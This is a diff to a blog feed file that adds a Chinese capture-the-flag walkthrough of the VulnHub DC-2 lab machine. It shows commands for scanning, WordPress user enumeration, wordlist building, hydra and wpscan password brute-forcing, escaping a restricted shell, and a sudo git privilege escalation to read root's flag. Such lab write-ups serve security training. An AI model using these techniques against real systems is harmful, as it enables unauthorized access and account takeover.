@@ -4,13 +4,31 @@
   
     
     <entry>
-      <title>DC-2</title>
+      <title>综合实战第二章-DC-2</title>
       <link href="/2022/04/29/DC-2/"/>
       <url>/2022/04/29/DC-2/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<h1 id="综合实战第二章"><a href="#综合实战第二章" class="headerlink" title="综合实战第二章"></a>综合实战第二章</h1><h2 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote><p>靶场下载：<a href="https://www.vulnhub.com/?page=2&amp;q=dc">https://www.vulnhub.com/?page=2&amp;q=dc</a></p><p>攻击机:kali 192.168.3.134</p><p>靶机:DC-2 192.168.3.163</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>老规矩，上nmap</p><pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.163也可以把结果放文件里nmap -T4 -A 192.168.3.163 -p 1-65535 -oN dc.txt</code></pre><p><img src="/2022/04/29/DC-2/image-20220429185031011.png" alt="image-20220429185031011"></p><p>可以看到网站的话没办法直接访问到dc-2</p><p>需要设置域名</p><pre class=" language-Linux"><code class="language-Linux">vim /etc/hosts在里面添加一项192.168.3.163 dc-2</code></pre><p><img src="/2022/04/29/DC-2/image-20220429185140583.png" alt="image-20220429185140583"></p><p>访问网站</p><p><img src="/2022/04/29/DC-2/image-20220429190345694.png" alt="image-20220429190345694"></p><p>flag1出来了</p><p>用nikto扫一下网站</p><pre class=" language-Linux"><code class="language-Linux">nikto -h dc-2</code></pre><p><img src="/2022/04/29/DC-2/image-20220429190146091.png" alt="image-20220429190146091"></p><p>看到有个wp-login.php这个网站，访问看看</p><p><img src="/2022/04/29/DC-2/image-20220429190449717.png" alt="image-20220429190449717"></p><p>现在需要用户名和密码</p><p>用wpscan</p><pre class=" language-Linux"><code class="language-Linux">wpscan --url dc-2 -e u</code></pre><p><img src="/2022/04/29/DC-2/image-20220429191341887.png" alt="image-20220429191341887"></p><p>找到三个用户<code>admin</code> <code>jerry</code> <code>tom</code></p><p>使用<code>cewl</code>搜集可能的密码</p><pre class=" language-Linux"><code class="language-Linux">cewl dc-2 -w pass.txt</code></pre><p>再新建一个user文件</p><pre class=" language-Linux"><code class="language-Linux">vi user</code></pre><p><img src="/2022/04/29/DC-2/image-20220429202742924.png" alt="image-20220429202742924"></p><p>里面放这玩意</p><p>接下来破解wp用户名密码</p><pre class=" language-Linux"><code class="language-Linux">wpscan --url dc-2 -U user -P pass.txt </code></pre><p><img src="/2022/04/29/DC-2/image-20220429203008526.png" alt="image-20220429203008526"></p><p>除了admin，剩下两个账号和密码已经出来了</p><p>尝试登录</p><p>用jerry账号登录，成功登进去，在里面找到一个flag2</p><p><img src="/2022/04/29/DC-2/image-20220429203152425.png" alt="image-20220429203152425"></p><p>我们尝试用ssh登录</p><pre class=" language-Linux"><code class="language-Linux">破解sshhydra -L user -P pass.txt 192.168.3.163 ssh -s 7744</code></pre><p><img src="/2022/04/29/DC-2/image-20220429204314330.png" alt="image-20220429204314330"></p><p>发现tom可以登录ssh</p><pre class=" language-Linux"><code class="language-Linux">ssh tom@192.168.3.163 -p 7744 </code></pre><p><img src="/2022/04/29/DC-2/image-20220429204535117.png" alt="image-20220429204535117"></p><p>发现cat没法使</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><pre class=" language-Linux"><code class="language-Linux">echo $PATH</code></pre><p>查看一下自己命令行在哪</p><p><img src="/2022/04/29/DC-2/image-20220429204757986.png" alt="image-20220429204757986"></p><p>然后再查看自己能用什么命令</p><pre class=" language-Linux"><code class="language-Linux">ls usr/bin</code></pre><p><img src="/2022/04/29/DC-2/image-20220429204833881.png" alt="image-20220429204833881"></p><p>可以用vi或者less读取flag3</p><pre class=" language-Linux"><code class="language-Linux">vi flag3.txt</code></pre><p><img src="/2022/04/29/DC-2/image-20220429204921847.png" alt="image-20220429204921847"></p><p>接下来调用<code>/bin/sh</code></p><pre class=" language-Linux"><code class="language-Linux">BASH_CMDS[a]=/bin/sh</code></pre><p>按下键盘a就可以调用&#x2F;bin&#x2F;sh</p><p>结果还是不能用cat，调用<code>/bin/bash</code></p><pre class=" language-Linux"><code class="language-Linux">/bin/bash</code></pre><p>依然没用</p><p>修改环境变量</p><pre class=" language-Linux"><code class="language-Linux">export PATH=PATH:/binexport PATH=PATH:/sbin:/bin</code></pre><p>再用cat查看flag，成功了</p><p><img src="/2022/04/29/DC-2/image-20220429205823175.png" alt="image-20220429205823175"></p><p>接下来就可以使用su命令了</p><pre class=" language-Linux"><code class="language-Linux">su jerrycd ~lscat flag4.txt</code></pre><p><img src="/2022/04/29/DC-2/image-20220429210015019.png" alt="image-20220429210015019"></p><p>接下来要用到git了</p><h3 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h3><p>先查看一下权限</p><pre class=" language-Linux"><code class="language-Linux">sudo -l</code></pre><p><img src="/2022/04/29/DC-2/image-20220429210136239.png" alt="image-20220429210136239"></p><p>发现git有root权限</p><h3 id="拿到最终flag"><a href="#拿到最终flag" class="headerlink" title="拿到最终flag"></a>拿到最终flag</h3><p><code>git</code>可以在help命令之后执行别的命令</p><pre class=" language-Linux"><code class="language-Linux">sudo git -p --help或者sudo git help config</code></pre><p><img src="/2022/04/29/DC-2/image-20220430092003344.png" alt="image-20220430092003344"></p><p>进到这种界面说明可以了</p><p>使用<code>!</code>加命令就可以了</p><pre class=" language-Linux"><code class="language-Linux">!ls /root</code></pre><p><img src="/2022/04/29/DC-2/image-20220430092052439.png" alt="image-20220430092052439"></p><pre class=" language-Linux"><code class="language-Linux">!cat /root/final-flag.txt</code></pre><p><img src="/2022/04/29/DC-2/image-20220430092131306.png" alt="image-20220430092131306"></p><p>结束，完美！</p>]]></content>
       
       
+      <categories>
+          
+          <category> 靶场练习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> 综合实战 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 靶场练习 </tag>
+            
+        </tags>
       
     </entry>
     
@@ -684,9 +702,9 @@
             
             <tag> 域 </tag>
             
-            <tag> 提权 </tag>
-            
             <tag> 信息搜集 </tag>
+            
+            <tag> 提权 </tag>
             
         </tags>
       
